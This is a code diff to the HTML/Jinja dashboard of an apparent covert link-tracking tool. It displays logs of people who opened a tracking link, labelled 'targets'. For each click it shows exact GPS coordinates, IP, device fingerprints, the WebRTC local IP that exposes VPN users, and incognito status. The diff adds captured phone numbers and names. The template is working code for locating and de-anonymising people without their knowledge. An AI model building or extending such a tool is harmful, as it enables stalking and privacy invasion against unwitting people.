@@ -3,70 +3,78 @@
 
 {% block content %}
 <div class="mb-6 flex items-center gap-4 flex-wrap">
-  <a href="/dashboard" class="text-gray-500 hover:text-white text-sm transition">← Dashboard</a>
-  <h1 class="text-xl font-bold gradient-text">Tracking Logs</h1>
-  <span class="text-gray-600 text-sm">({{ logs|length }} click{{ 's' if logs|length != 1 else '' }})</span>
-  <div class="ml-auto flex gap-2">
-    {% if logs %}
-    <button onclick="exportCSV()" id="exportBtn"
-      class="text-sm glass text-gray-300 hover:text-white px-4 py-1.5 rounded-lg transition hover:bg-white/5 font-medium">
-      📥 Export CSV
-    </button>
-    <a href="/dashboard/map/{{ link_id }}"
-      class="text-sm bg-gradient-to-r from-yellow-600 to-orange-600 hover:from-yellow-500 hover:to-orange-500 px-4 py-1.5 rounded-lg transition text-white font-medium hover:shadow-lg hover:shadow-yellow-900/20">
-      🗺️ View Map
-    </a>
-    {% endif %}
-  </div>
+  <a href="/dashboard" class="text-gray-500 hover:text-white text-sm transition">
+    ← Dashboard
+  </a>
+  <h1 class="text-2xl font-bold gradient-text">Tracking Logs</h1>
+  <span class="text-gray-500 text-sm">({{ logs|length }} clicks)</span>
+  {% if logs %}
+  <a href="/dashboard/map/{{ link_id }}" class="ml-auto text-xs bg-yellow-600/20 text-yellow-400 border border-yellow-600/30 px-3 py-1.5 rounded-lg hover:bg-yellow-600/30 transition flex items-center gap-1.5 font-medium">
+    🗺️ Open Map View
+  </a>
+  <button onclick="exportCSV()" class="text-xs bg-gray-800 text-gray-300 border border-gray-700/50 px-3 py-1.5 rounded-lg hover:bg-gray-700 transition flex items-center gap-1.5 font-medium">
+    📥 Export CSV
+  </button>
+  {% endif %}
 </div>
 
 {% if not logs %}
 <div class="glass rounded-2xl p-16 text-center">
-  <div class="text-4xl mb-3 opacity-30">📭</div>
-  <p class="text-gray-600 text-sm">No clicks recorded yet. The link may not have been opened.</p>
+  <div class="text-4xl mb-3 opacity-30">📫</div>
+  <p class="text-gray-500 text-sm">No clicks recorded yet. The link may not have been opened.</p>
 </div>
 {% else %}
 
-<!-- Summary cards -->
-<div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-3 mb-6">
-  <div class="glass rounded-xl p-4 stat-card">
-    <p class="text-[10px] text-gray-500 uppercase tracking-wider mb-1">Total Clicks</p>
-    <p class="text-2xl font-bold text-white">{{ logs|length }}</p>
+<!-- Stats Summary Row -->
+<div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-3 mb-6">
+  <div class="stat-card p-4 rounded-xl">
+    <div class="text-xs text-gray-500 mb-1">Total Clicks</div>
+    <div class="text-xl font-bold text-white">{{ logs|length }}</div>
   </div>
-  <div class="glass rounded-xl p-4 stat-card">
-    <p class="text-[10px] text-gray-500 uppercase tracking-wider mb-1">GPS Locations</p>
-    <p class="text-2xl font-bold text-green-400">{{ logs | selectattr('gps_lat') | list | length }}</p>
+  <div class="stat-card p-4 rounded-xl">
+    <div class="text-xs text-gray-500 mb-1">Unique IPs</div>
+    <div class="text-xl font-bold text-yellow-400">
+      {{ logs|map(attribute='ip_address')|unique|list|length }}
+    </div>
   </div>
-  <div class="glass rounded-xl p-4 stat-card">
-    <p class="text-[10px] text-gray-500 uppercase tracking-wider mb-1">Mobile</p>
-    <p class="text-2xl font-bold text-blue-400">{{ logs | selectattr('is_mobile') | list | length }}</p>
+  <div class="stat-card p-4 rounded-xl">
+    <div class="text-xs text-gray-500 mb-1">Mobile Devices</div>
+    <div class="text-xl font-bold text-blue-400">
+      {{ logs|selectattr('is_mobile')|list|length }}
+    </div>
   </div>
-  <div class="glass rounded-xl p-4 stat-card">
-    <p class="text-[10px] text-gray-500 uppercase tracking-wider mb-1">Proxy / VPN</p>
-    <p class="text-2xl font-bold text-red-400">{{ logs | selectattr('proxy') | list | length }}</p>
+  <div class="stat-card p-4 rounded-xl">
+    <div class="text-xs text-gray-500 mb-1">VPN / Proxy</div>
+    <div class="text-xl font-bold text-red-400">
+      {{ logs|selectattr('proxy')|list|length }}
+    </div>
   </div>
-  <div class="glass rounded-xl p-4 stat-card">
-    <p class="text-[10px] text-gray-500 uppercase tracking-wider mb-1">Fingerprints</p>
-    <p class="text-2xl font-bold text-purple-400">{{ logs | map(attribute='canvas_hash') | select | unique | list | length }}</p>
+  <div class="stat-card p-4 rounded-xl">
+    <div class="text-xs text-gray-500 mb-1">Incognito Hits</div>
+    <div class="text-xl font-bold text-purple-400">
+      {{ logs|selectattr('is_incognito')|list|length }}
+    </div>
   </div>
-  <div class="glass rounded-xl p-4 stat-card">
-    <p class="text-[10px] text-gray-500 uppercase tracking-wider mb-1">Incognito</p>
-    <p class="text-2xl font-bold text-orange-400">{{ logs | selectattr('is_incognito') | list | length }}</p>
+  <div class="stat-card p-4 rounded-xl">
+    <div class="text-xs text-gray-500 mb-1">GPS Exact Hits</div>
+    <div class="text-xl font-bold text-green-400">
+      {{ logs|selectattr('gps_lat')|list|length }}
+    </div>
   </div>
 </div>
 
-<!-- Logs table -->
+<!-- Logs Table -->
 <div class="glass rounded-2xl overflow-hidden">
   <div class="overflow-x-auto">
-    <table class="w-full text-xs" id="logsTable">
+    <table class="w-full text-xs">
       <thead>
         <tr class="border-b border-gray-800/50 text-gray-500 uppercase tracking-wider text-[10px]">
           <th class="text-left px-4 py-3">#</th>
           <th class="text-left px-4 py-3">Time</th>
-          <th class="text-left px-4 py-3">IP</th>
+          <th class="text-left px-4 py-3">IP / Mobile</th>
           <th class="text-left px-4 py-3">Location</th>
-          <th class="text-left px-4 py-3">ISP</th>
-          <th class="text-left px-4 py-3">Device</th>
+          <th class="text-left px-4 py-3">ISP / Carrier</th>
+          <th class="text-left px-4 py-3">Device & Model</th>
           <th class="text-left px-4 py-3">OS / Browser</th>
           <th class="text-left px-4 py-3">Fingerprint</th>
           <th class="text-left px-4 py-3">Flags</th>
@@ -74,36 +82,50 @@
       </thead>
       <tbody class="divide-y divide-gray-800/30">
         {% for log in logs %}
-        <tr class="clickable-row" onclick="toggleDetail({{ loop.index }})" title="Click to expand details">
-          <td class="px-4 py-3 text-gray-600">{{ loop.index }}</td>
+        <tr class="hover:bg-white/[0.02] transition cursor-pointer" onclick="toggleDetail({{ loop.index }})">
+          <td class="px-4 py-3 text-gray-600 font-mono">{{ loop.index }}</td>
           <td class="px-4 py-3 text-gray-400 whitespace-nowrap">
             {{ log.clicked_at[:19] if log.clicked_at else '—' }}
           </td>
-          <td class="px-4 py-3 font-mono text-yellow-300">{{ log.ip_address or '—' }}</td>
+          <td class="px-4 py-3">
+            <div class="flex flex-col gap-0.5">
+              <span class="font-mono text-yellow-300 font-medium">{{ log.ip_address or '—' }}</span>
+              {% if log.captured_phone %}
+              <span class="text-green-400 text-[10px] font-semibold">📞 {{ log.captured_phone }}</span>
+              {% endif %}
+            </div>
+          </td>
           <td class="px-4 py-3 text-gray-300 whitespace-nowrap">
             {{ log.city or '' }}{% if log.city and log.country %}, {% endif %}{{ log.country or '—' }}
+            {% if log.gps_lat %}
+            <span class="text-green-400 text-[10px] ml-1 font-semibold">📍 GPS (±{{ log.gps_accuracy|int if log.gps_accuracy else '?' }}m)</span>
+            {% endif %}
           </td>
           <td class="px-4 py-3 text-gray-400 max-w-[140px] truncate">{{ log.isp or '—' }}</td>
           <td class="px-4 py-3">
             <div class="flex flex-col gap-0.5">
-              {% if log.device_brand %}
-              <span class="text-gray-200 text-[11px]">{{ log.device_brand }} {{ log.device_model or '' }}</span>
+              <span class="text-gray-200 font-semibold text-[11px]">{{ log.device_brand or '' }} {{ log.device_model or '' }}</span>
+              {% if log.chipset %}
+              <span class="text-cyan-400 text-[9px]">⚡ {{ log.chipset }}</span>
               {% endif %}
-              <span class="badge-{{ log.device_type or 'pc' }} text-[10px] px-1.5 py-0.5 rounded font-medium w-fit">
+              <span class="badge-{{ log.device_type or 'pc' }} text-[9px] px-1.5 py-0.5 rounded font-medium w-fit mt-0.5">
                 {{ log.device_type or 'pc' }}
               </span>
             </div>
           </td>
-          <td class="px-4 py-3 text-gray-400">
-            {{ log.os or '—' }}{% if log.os_version %} {{ log.os_version }}{% endif %}
+          <td class="px-4 py-3 text-gray-300">
+            <span class="font-medium">{{ log.os or '—' }}</span>
             <br>
-            <span class="text-gray-600">{{ log.browser or '' }}{% if log.browser_version %} {{ log.browser_version }}{% endif %}</span>
+            <span class="text-gray-500 text-[10px]">{{ log.browser or '' }}{% if log.browser_version %} {{ log.browser_version }}{% endif %}</span>
           </td>
           <td class="px-4 py-3 font-mono text-[10px] text-purple-400">
             {{ (log.canvas_hash or '—')[:10] }}{% if log.canvas_hash and log.canvas_hash|length > 10 %}…{% endif %}
           </td>
           <td class="px-4 py-3">
             <div class="flex gap-1 flex-wrap">
+              {% if log.captured_phone %}
+              <span class="bg-green-500/20 text-green-300 border border-green-500/40 text-[10px] px-1.5 py-0.5 rounded font-bold">Captured Phone</span>
+              {% endif %}
               {% if log.proxy %}
               <span class="badge-proxy text-[10px] px-1.5 py-0.5 rounded font-medium">VPN</span>
               {% endif %}
@@ -116,11 +138,8 @@
               {% if log.mobile %}
               <span class="badge-mobile text-[10px] px-1.5 py-0.5 rounded font-medium">Mobile Net</span>
               {% endif %}
-              {% if log.is_bot %}
-              <span class="badge-bot text-[10px] px-1.5 py-0.5 rounded font-medium">Bot</span>
-              {% endif %}
               {% if log.gps_lat %}
-              <span class="badge-gps text-[10px] px-1.5 py-0.5 rounded font-medium">GPS</span>
+              <span class="badge-gps text-[10px] px-1.5 py-0.5 rounded font-medium">Exact GPS</span>
               {% endif %}
             </div>
           </td>
@@ -131,75 +150,84 @@
             <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 text-xs">
               <!-- Location -->
               <div class="space-y-2">
-                <h4 class="text-gray-400 font-semibold uppercase text-[10px] tracking-wider border-b border-gray-800/50 pb-1">📍 Location</h4>
+                <h4 class="text-gray-400 font-semibold uppercase text-[10px] tracking-wider border-b border-gray-800/50 pb-1">📍 Location Details</h4>
                 <div class="space-y-1 text-gray-300">
-                  <div><span class="text-gray-500 w-20 inline-block">IP:</span> <span class="font-mono text-yellow-300">{{ log.ip_address or '—' }}</span></div>
-                  <div><span class="text-gray-500 w-20 inline-block">Country:</span> {{ log.country or '—' }} {{ log.country_code or '' }}</div>
-                  <div><span class="text-gray-500 w-20 inline-block">City:</span> {{ log.city or '—' }}, {{ log.region or '' }}</div>
-                  <div><span class="text-gray-500 w-20 inline-block">Timezone:</span> {{ log.timezone_name or log.timezone or '—' }}</div>
-                  <div><span class="text-gray-500 w-20 inline-block">TZ Offset:</span> {{ log.timezone_offset if log.timezone_offset is not none else '—' }} min</div>
+                  <div><span class="text-gray-500 w-24 inline-block">IP:</span> <span class="font-mono text-yellow-300">{{ log.ip_address or '—' }}</span></div>
+                  <div><span class="text-gray-500 w-24 inline-block">Country:</span> {{ log.country or '—' }} {{ log.country_code or '' }}</div>
+                  <div><span class="text-gray-500 w-24 inline-block">City / State:</span> {{ log.city or '—' }}, {{ log.region or '' }}</div>
+                  <div><span class="text-gray-500 w-24 inline-block">Timezone:</span> {{ log.timezone_name or log.timezone or '—' }} ({{ log.timezone_offset }} min)</div>
                   {% if log.gps_lat %}
-                  <div><span class="text-gray-500 w-20 inline-block">GPS:</span> <span class="text-green-400">{{ "%.6f"|format(log.gps_lat) }}, {{ "%.6f"|format(log.gps_lng) }}</span> (±{{ log.gps_accuracy or '?' }}m)</div>
+                  <div><span class="text-gray-500 w-24 inline-block">Exact GPS:</span> <a href="https://maps.google.com/?q={{ log.gps_lat }},{{ log.gps_lng }}" target="_blank" class="text-green-400 hover:underline font-mono">{{ "%.6f"|format(log.gps_lat) }}, {{ "%.6f"|format(log.gps_lng) }} (±{{ log.gps_accuracy|int if log.gps_accuracy else '?' }}m)</a></div>
+                  {% else %}
+                  <div><span class="text-gray-500 w-24 inline-block">Precision:</span> <span class="text-gray-400">IP Geolocation (ISP Hub)</span></div>
                   {% endif %}
                 </div>
               </div>
               <!-- Device -->
               <div class="space-y-2">
-                <h4 class="text-gray-400 font-semibold uppercase text-[10px] tracking-wider border-b border-gray-800/50 pb-1">💻 Device</h4>
+                <h4 class="text-gray-400 font-semibold uppercase text-[10px] tracking-wider border-b border-gray-800/50 pb-1">💻 Hardware & OS</h4>
                 <div class="space-y-1 text-gray-300">
-                  <div><span class="text-gray-500 w-20 inline-block">Brand:</span> {{ log.device_brand or '—' }} {{ log.device_model or '' }}</div>
-                  <div><span class="text-gray-500 w-20 inline-block">Type:</span> {{ log.device_type or '—' }}</div>
-                  <div><span class="text-gray-500 w-20 inline-block">OS:</span> {{ log.os or '—' }} {{ log.os_version or '' }}</div>
-                  <div><span class="text-gray-500 w-20 inline-block">Browser:</span> {{ log.browser or '—' }} {{ log.browser_version or '' }}</div>
-                  <div><span class="text-gray-500 w-20 inline-block">Screen:</span> {{ log.screen_width or '?' }}×{{ log.screen_height or '?' }} (avail {{ log.screen_avail_w or '?' }}×{{ log.screen_avail_h or '?' }})</div>
-                  <div><span class="text-gray-500 w-20 inline-block">Color:</span> {{ log.color_depth or '—' }}bit · {{ log.pixel_ratio or '—' }}x DPR</div>
-                  <div><span class="text-gray-500 w-20 inline-block">Touch:</span> {{ '✓' if log.touch_support else '✗' }} ({{ log.max_touch_points or 0 }} points)</div>
-                  <div><span class="text-gray-500 w-20 inline-block">Cores:</span> {{ log.hardware_concurrency or '—' }}</div>
-                  <div><span class="text-gray-500 w-20 inline-block">Memory:</span> {{ log.device_memory or '—' }} GB</div>
+                  <div><span class="text-gray-500 w-24 inline-block">Model:</span> <span class="text-white font-bold">{{ log.device_brand or '' }} {{ log.device_model or '' }}</span></div>
+                  {% if log.chipset %}
+                  <div><span class="text-gray-500 w-24 inline-block">Chipset:</span> <span class="text-cyan-400">{{ log.chipset }}</span></div>
+                  {% endif %}
+                  <div><span class="text-gray-500 w-24 inline-block">OS:</span> <span class="text-emerald-400 font-semibold">{{ log.os or '—' }}</span></div>
+                  <div><span class="text-gray-500 w-24 inline-block">Browser:</span> {{ log.browser or '—' }} {{ log.browser_version or '' }}</div>
+                  <div><span class="text-gray-500 w-24 inline-block">Screen:</span> {{ log.screen_width or '?' }}×{{ log.screen_height or '?' }} ({{ log.pixel_ratio or '—' }}x DPR, {{ log.color_depth or '—' }}bit)</div>
+                  <div><span class="text-gray-500 w-24 inline-block">Cores / RAM:</span> {{ log.hardware_concurrency or '—' }} Cores · {{ log.device_memory or '—' }} GB RAM</div>
+                  <div><span class="text-gray-500 w-24 inline-block">Touch:</span> {{ '✓' if log.touch_support else '✗' }} ({{ log.max_touch_points or 0 }} points)</div>
                 </div>
               </div>
-              <!-- Fingerprints -->
+              <!-- Captured Target Info -->
               <div class="space-y-2">
-                <h4 class="text-gray-400 font-semibold uppercase text-[10px] tracking-wider border-b border-gray-800/50 pb-1">🔐 Fingerprints</h4>
+                <h4 class="text-gray-400 font-semibold uppercase text-[10px] tracking-wider border-b border-gray-800/50 pb-1">👤 Target Capture</h4>
                 <div class="space-y-1 text-gray-300">
-                  <div><span class="text-gray-500 w-20 inline-block">Canvas:</span> <span class="font-mono text-purple-400">{{ log.canvas_hash or '—' }}</span></div>
-                  <div><span class="text-gray-500 w-20 inline-block">Audio:</span> <span class="font-mono text-purple-400">{{ log.audio_hash or '—' }}</span></div>
-                  <div><span class="text-gray-500 w-20 inline-block">Fonts:</span> <span class="font-mono text-purple-400">{{ log.fonts_hash or '—' }}</span></div>
-                  <div><span class="text-gray-500 w-20 inline-block">WebGL:</span> {{ log.webgl_vendor or '—' }}</div>
-                  <div><span class="text-gray-500 w-20 inline-block">GPU:</span> {{ log.webgl_renderer or '—' }}</div>
+                  {% if log.captured_phone %}
+                  <div><span class="text-gray-500 w-24 inline-block">Mobile No:</span> <span class="text-green-400 font-bold text-sm">{{ log.captured_phone }}</span></div>
+                  {% else %}
+                  <div><span class="text-gray-500 w-24 inline-block">Mobile No:</span> <span class="text-gray-500 italic">Not entered (Silent mode)</span></div>
+                  {% endif %}
+                  {% if log.captured_name %}
+                  <div><span class="text-gray-500 w-24 inline-block">Name:</span> <span class="text-white font-bold">{{ log.captured_name }}</span></div>
+                  {% endif %}
+                  <div><span class="text-gray-500 w-24 inline-block">Battery:</span> {{ '%d%%'|format((log.battery_level or 0) * 100) if log.battery_level is not none else '—' }} {{ '⚡ Charging' if log.battery_charging else '' }}</div>
+                  <div><span class="text-gray-500 w-24 inline-block">Language:</span> {{ log.language or '—' }}</div>
+                  <div><span class="text-gray-500 w-24 inline-block">Platform:</span> {{ log.platform or '—' }}</div>
                 </div>
               </div>
               <!-- Network -->
               <div class="space-y-2">
-                <h4 class="text-gray-400 font-semibold uppercase text-[10px] tracking-wider border-b border-gray-800/50 pb-1">🌐 Network</h4>
+                <h4 class="text-gray-400 font-semibold uppercase text-[10px] tracking-wider border-b border-gray-800/50 pb-1">🌐 Network & Carrier</h4>
                 <div class="space-y-1 text-gray-300">
-                  <div><span class="text-gray-500 w-20 inline-block">ISP:</span> {{ log.isp or '—' }}</div>
-                  <div><span class="text-gray-500 w-20 inline-block">Org:</span> {{ log.org or '—' }}</div>
-                  <div><span class="text-gray-500 w-20 inline-block">Conn:</span> {{ log.connection_type or '—' }}</div>
-                  <div><span class="text-gray-500 w-20 inline-block">WebRTC IP:</span> <span class="font-mono text-yellow-300">{{ log.webrtc_local_ip or '—' }}</span></div>
-                  <div><span class="text-gray-500 w-20 inline-block">Proxy:</span> {{ '🔴 Yes' if log.proxy else '—' }}</div>
-                  <div><span class="text-gray-500 w-20 inline-block">Hosting:</span> {{ '⚠️ Yes' if log.hosting else '—' }}</div>
+                  <div><span class="text-gray-500 w-24 inline-block">ISP / Carrier:</span> {{ log.isp or '—' }}</div>
+                  <div><span class="text-gray-500 w-24 inline-block">Type / Speed:</span> {{ log.connection_type or '—' }} {% if log.network_downlink %} ({{ log.network_downlink }} Mbps){% endif %}</div>
+                  {% if log.network_rtt %}
+                  <div><span class="text-gray-500 w-24 inline-block">Latency RTT:</span> {{ log.network_rtt }} ms</div>
+                  {% endif %}
+                  <div><span class="text-gray-500 w-24 inline-block">WebRTC IP:</span> <span class="font-mono text-yellow-300">{{ log.webrtc_local_ip or '—' }}</span></div>
+                  <div><span class="text-gray-500 w-24 inline-block">VPN / Proxy:</span> {{ '🔴 Yes' if log.proxy else '—' }}</div>
+                  <div><span class="text-gray-500 w-24 inline-block">Hosting IP:</span> {{ '⚠️ Yes' if log.hosting else '—' }}</div>
                 </div>
               </div>
-              <!-- Privacy -->
+              <!-- Fingerprints -->
               <div class="space-y-2">
-                <h4 class="text-gray-400 font-semibold uppercase text-[10px] tracking-wider border-b border-gray-800/50 pb-1">🛡️ Privacy</h4>
+                <h4 class="text-gray-400 font-semibold uppercase text-[10px] tracking-wider border-b border-gray-800/50 pb-1">🔐 Forensics Hash</h4>
                 <div class="space-y-1 text-gray-300">
-                  <div><span class="text-gray-500 w-20 inline-block">DNT:</span> {{ log.do_not_track or '—' }}</div>
-                  <div><span class="text-gray-500 w-20 inline-block">Cookies:</span> {{ '✓' if log.cookie_enabled else '✗' }}</div>
-                  <div><span class="text-gray-500 w-20 inline-block">AdBlock:</span> {{ '🟡 Yes' if log.has_ad_blocker else '—' }}</div>
-                  <div><span class="text-gray-500 w-20 inline-block">Incognito:</span> {{ '🟠 Yes' if log.is_incognito else '—' }}</div>
-                  <div><span class="text-gray-500 w-20 inline-block">Battery:</span> {{ '%d%%'|format((log.battery_level or 0) * 100) if log.battery_level is not none else '—' }} {{ '⚡ Charging' if log.battery_charging else '' }}</div>
+                  <div><span class="text-gray-500 w-24 inline-block">Canvas:</span> <span class="font-mono text-purple-400">{{ log.canvas_hash or '—' }}</span></div>
+                  <div><span class="text-gray-500 w-24 inline-block">Audio:</span> <span class="font-mono text-purple-400">{{ log.audio_hash or '—' }}</span></div>
+                  <div><span class="text-gray-500 w-24 inline-block">Fonts:</span> <span class="font-mono text-purple-400">{{ log.fonts_hash or '—' }}</span></div>
+                  <div><span class="text-gray-500 w-24 inline-block">WebGL:</span> {{ log.webgl_vendor or '—' }}</div>
+                  <div><span class="text-gray-500 w-24 inline-block">GPU:</span> {{ log.webgl_renderer or '—' }}</div>
                 </div>
               </div>
-              <!-- Meta -->
+              <!-- Privacy & Security -->
               <div class="space-y-2">
-                <h4 class="text-gray-400 font-semibold uppercase text-[10px] tracking-wider border-b border-gray-800/50 pb-1">📋 Meta</h4>
+                <h4 class="text-gray-400 font-semibold uppercase text-[10px] tracking-wider border-b border-gray-800/50 pb-1">🛡️ Privacy Flags</h4>
                 <div class="space-y-1 text-gray-300">
-                  <div><span class="text-gray-500 w-20 inline-block">Platform:</span> {{ log.platform or '—' }}</div>
-                  <div><span class="text-gray-500 w-20 inline-block">Language:</span> {{ log.language or '—' }}</div>
-                  <div><span class="text-gray-500 w-20 inline-block">Referrer:</span> {{ log.referrer or '—' }}</div>
-                  <div><span class="text-gray-500 w-20 inline-block">Plugins:</span> {{ (log.plugins or '—')[:60] }}{% if log.plugins and log.plugins|length > 60 %}…{% endif %}</div>
+                  <div><span class="text-gray-500 w-24 inline-block">Incognito:</span> {{ '🟠 Yes' if log.is_incognito else '—' }}</div>
+                  <div><span class="text-gray-500 w-24 inline-block">AdBlocker:</span> {{ '🟡 Yes' if log.has_ad_blocker else '—' }}</div>
+                  <div><span class="text-gray-500 w-24 inline-block">DNT:</span> {{ log.do_not_track or '—' }}</div>
+                  <div><span class="text-gray-500 w-24 inline-block">Cookies:</span> {{ '✓' if log.cookie_enabled else '✗' }}</div>
                 </div>
               </div>
             </div>
@@ -221,45 +249,7 @@
   }
 
   function exportCSV() {
-    const headers = [
-      'Time','IP','Country','City','Region','ISP','Org','Device Type','Device Brand','Device Model',
-      'OS','OS Version','Browser','Browser Version','Screen','Language','Platform',
-      'Canvas Hash','Audio Hash','Fonts Hash','WebGL Vendor','WebGL Renderer',
-      'Color Depth','Pixel Ratio','Touch','Touch Points','CPU Cores','Memory GB',
-      'Timezone','TZ Offset','Connection','WebRTC IP',
-      'Proxy','Hosting','Mobile Net','Ad Blocker','Incognito','Battery','Charging',
-      'GPS Lat','GPS Lng','GPS Accuracy','Referrer'
-    ];
-
-    const logs = {{ logs | tojson }};
-    let csv = headers.join(',') + '\n';
-
-    logs.forEach(function(l) {
-      const row = [
-        l.clicked_at || '', l.ip_address || '', l.country || '', l.city || '', l.region || '',
-        l.isp || '', l.org || '', l.device_type || '', l.device_brand || '', l.device_model || '',
-        l.os || '', l.os_version || '', l.browser || '', l.browser_version || '',
-        (l.screen_width || '') + 'x' + (l.screen_height || ''), l.language || '', l.platform || '',
-        l.canvas_hash || '', l.audio_hash || '', l.fonts_hash || '', l.webgl_vendor || '', l.webgl_renderer || '',
-        l.color_depth || '', l.pixel_ratio || '', l.touch_support || '', l.max_touch_points || '',
-        l.hardware_concurrency || '', l.device_memory || '',
-        l.timezone_name || '', l.timezone_offset || '', l.connection_type || '', l.webrtc_local_ip || '',
-        l.proxy || '', l.hosting || '', l.mobile || '', l.has_ad_blocker || '', l.is_incognito || '',
-        l.battery_level || '', l.battery_charging || '',
-        l.gps_lat || '', l.gps_lng || '', l.gps_accuracy || '', l.referrer || ''
-      ].map(function(v) {
-        return '"' + String(v).replace(/"/g, '""') + '"';
-      });
-      csv += row.join(',') + '\n';
-    });
-
-    const blob = new Blob([csv], { type: 'text/csv' });
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = 'cybertrack_logs_{{ link_id }}.csv';
-    a.click();
-    URL.revokeObjectURL(url);
+    window.location.href = '/api/stats/{{ link_id }}/export';
   }
 </script>
 {% endblock %}
